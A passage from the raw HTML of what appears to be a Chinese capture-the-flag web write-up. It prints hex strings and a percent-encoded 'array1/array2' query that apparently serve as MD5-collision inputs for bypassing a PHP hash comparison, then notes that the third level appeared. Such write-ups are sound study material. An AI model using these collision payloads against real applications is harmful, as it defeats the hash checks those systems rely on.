class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x28</span>\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br>$<span class="hljs-variable">data2</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x87</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span><span class="hljs-char escape_">\x71</span><span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2\xb4<span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%af</span><span class="hljs-variable">%13</span><span class="hljs-variable">%76</span><span class="hljs-variable">%70</span><span class="hljs-variable">%82</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%58</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%23</span><span class="hljs-variable">%38</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%db</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%90</span><span class="hljs-variable">%68</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%e9</span><span class="hljs-variable">%47</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%0</span>a<span class="hljs-variable">%c0</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%31</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%82</span><span class="hljs-variable">%25</span><span class="hljs-variable">%92</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%cf</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%47</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%5</span>d<span class="hljs-variable">%1</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%f7</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%1</span>d<span class="hljs-variable">%bc</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%06</span><span class="hljs-variable">%46</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%0</span>f<span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span>b<span class="hljs-variable">%e9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%66</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%e1</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%97</span><span class="hljs-variable">%b6</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%48</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%6</span>a<span class="hljs-variable">%5</span>d<span class="hljs-variable">%6</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%77</span><span class="hljs-variable">%72</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%47</span><span class="hljs-variable">%16</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%06</span><span class="hljs-variable">%72</span><span class="hljs-variable">%71</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%00</span><span class="hljs-variable">%f6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%ee</span><span class="hljs-variable">%54</span><span class="hljs-variable">%27</span><span class="hljs-variable">%71</span><span class="hljs-variable">%be</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%93</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%52</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%53</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%ea</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%70</span><span class="hljs-variable">%71</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%21</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%44</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%22</span><span class="hljs-variable">%87</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%be</span><span class="hljs-variable">%79</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%61</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%08</span><span class="hljs-variable">%57</span><span class="hljs-variable">%02</span><span class="hljs-variable">%82</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%ef</span><span class="hljs-variable">%36</span><span class="hljs-variable">%95</span><span class="hljs-variable">%da</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%13</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%7</span>e<span class="hljs-variable">%a3</span><span class="hljs-variable">%59</span><span class="hljs-variable">%45</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%25</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%77</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%de</span><span class="hljs-variable">%73</span><span class="hljs-variable">%24</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%66</span><span class="hljs-variable">%74</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%68</span><span class="hljs-variable">%06</span><span class="hljs-variable">%80</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%74</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%31</span><span class="hljs-variable">%05</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%15</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%bc</span><span class="hljs-variable">%0</span>b<span class="hljs-variable">%0</span>f<span class="hljs-variable">%21</span><span class="hljs-variable">%23</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%17</span><span class="hljs-variable">%12</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%b3</span><span class="hljs-variable">%10</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%37</span><span class="hljs-variable">%60</span><span class="hljs-variable">%68</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%35</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%54</span><span class="hljs-variable">%97</span><span class="hljs-variable">%08</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%93</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%1</span>f<span class="hljs-variable">%0</span>b<span class="hljs-variable">%35</span><span class="hljs-variable">%11</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%ba</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ad</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%52</span><span class="hljs-variable">%98</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%84</span><span class="hljs-variable">%12</span><span class="hljs-variable">%77</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%64</span><span class="hljs-variable">%da</span><span class="hljs-variable">%a3</span><span class="hljs-variable">%65</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%d5</span><span class="hljs-variable">%76</span><span class="hljs-variable">%55</span><span class="hljs-variable">%57</span><span class="hljs-variable">%46</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%89</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%df</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%85</span><span class="hljs-variable">%97</span><span class="hljs-variable">%1</span>e<span class="hljs-variable">%f6</span><span class="hljs-variable">%38</span><span class="hljs-variable">%66</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%17</span><span class="hljs-variable">%22</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ea</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%14</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%35</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%0</span>a<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%34</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%73</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%98</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%43</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%62</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%69</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%57</span><span class="hljs-variable">%52</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%41</span><span class="hljs-variable">%b1</span><span class="hljs-variable">%91</span><span class="hljs-variable">%65</span><span class="hljs-variable">%f2</span><span class="hljs-variable">%30</span><span class="hljs-variable">%7</span>f<span class="hljs-variable">%cf</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%93</span><span class="hljs-variable">%40</span><span class="hljs-variable">%1</span>a<span class="hljs-variable">%13</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%09</span><span class="hljs-variable">%c5</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%87</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%48</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%62</span><span class="hljs-variable">%04</span><span class="hljs-variable">%a7</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%f4</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a6</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%ed</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%b9</span><span class="hljs-variable">%05</span><span class="hljs-variable">%39</span><span class="hljs-variable">%95</span><span class="hljs-variable">%ab</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%af</span><span class="hljs-variable">%13</span><span class="hljs-variable">%76</span><span class="hljs-variable">%70</span><span class="hljs-variable">%82</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%58</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%23</span><span class="hljs-variable">%38</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%db</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%90</span><span class="hljs-variable">%68</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%e9</span><span class="hljs-variable">%47</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%0</span>a<span class="hljs-variable">%c0</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%31</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%82</span><span class="hljs-variable">%25</span><span class="hljs-variable">%92</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%cf</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%47</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%5</span>d<span class="hljs-variable">%1</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%f7</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%1</span>d<span class="hljs-variable">%bc</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%06</span><span class="hljs-variable">%46</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%0</span>f<span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span>b<span class="hljs-variable">%e9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%66</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%e1</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%97</span><span class="hljs-variable">%b6</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%48</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%6</span>a<span class="hljs-variable">%5</span>d<span class="hljs-variable">%6</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%77</span><span class="hljs-variable">%72</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%47</span><span class="hljs-variable">%16</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%06</span><span class="hljs-variable">%72</span><span class="hljs-variable">%71</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%00</span><span class="hljs-variable">%f6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%ee</span><span class="hljs-variable">%54</span><span class="hljs-variable">%27</span><span class="hljs-variable">%71</span><span class="hljs-variable">%be</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%93</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%52</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%53</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%ea</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%70</span><span class="hljs-variable">%71</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%21</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%44</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%22</span><span class="hljs-variable">%87</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%be</span><span class="hljs-variable">%79</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%61</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%08</span><span class="hljs-variable">%57</span><span class="hljs-variable">%02</span><span class="hljs-variable">%82</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%ef</span><span class="hljs-variable">%36</span><span class="hljs-variable">%95</span><span class="hljs-variable">%da</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%13</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%7</span>e<span class="hljs-variable">%a3</span><span class="hljs-variable">%59</span><span class="hljs-variable">%45</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%25</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%77</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%de</span><span class="hljs-variable">%73</span><span class="hljs-variable">%24</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%66</span><span class="hljs-variable">%74</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%68</span><span class="hljs-variable">%06</span><span class="hljs-variable">%80</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%74</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%31</span><span class="hljs-variable">%05</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%15</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%bc</span><span class="hljs-variable">%0</span>b<span class="hljs-variable">%0</span>f<span class="hljs-variable">%21</span><span class="hljs-variable">%23</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%17</span><span class="hljs-variable">%12</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%b3</span><span class="hljs-variable">%10</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%37</span><span class="hljs-variable">%60</span><span class="hljs-variable">%68</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%35</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%54</span><span class="hljs-variable">%97</span><span class="hljs-variable">%08</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%93</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%1</span>f<span class="hljs-variable">%0</span>b<span class="hljs-variable">%35</span><span class="hljs-variable">%11</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%ba</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ad</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%52</span><span class="hljs-variable">%98</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%84</span><span class="hljs-variable">%12</span><span class="hljs-variable">%77</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%64</span><span class="hljs-variable">%da</span><span class="hljs-variable">%a3</span><span class="hljs-variable">%65</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%d5</span><span class="hljs-variable">%76</span><span class="hljs-variable">%55</span><span class="hljs-variable">%57</span><span class="hljs-variable">%46</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%89</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%b2</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%85</span><span class="hljs-variable">%97</span><span class="hljs-variable">%1</span>e<span class="hljs-variable">%f6</span><span class="hljs-variable">%38</span><span class="hljs-variable">%66</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%17</span><span class="hljs-variable">%22</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ea</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%14</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%35</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%0</span>a<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%34</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%f3</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%98</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%43</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%62</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%e9</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%57</span><span class="hljs-variable">%52</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%41</span><span class="hljs-variable">%b1</span><span class="hljs-variable">%91</span><span class="hljs-variable">%65</span><span class="hljs-variable">%f2</span><span class="hljs-variable">%30</span><span class="hljs-variable">%7</span>f<span class="hljs-variable">%cf</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%13</span><span class="hljs-variable">%40</span><span class="hljs-variable">%1</span>a<span class="hljs-variable">%13</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%09</span><span class="hljs-variable">%c5</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%87</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%48</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%62</span><span class="hljs-variable">%04</span><span class="hljs-variable">%a7</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%f4</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%74</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a6</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%ed</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%39</span><span class="hljs-variable">%05</span><span class="hljs-variable">%39</span><span class="hljs-variable">%95</span><span class="hljs-variable">%ab</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123152944845.png" alt="image-20240123152944845"></p><p>出现了第三关</p><p>0x03</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 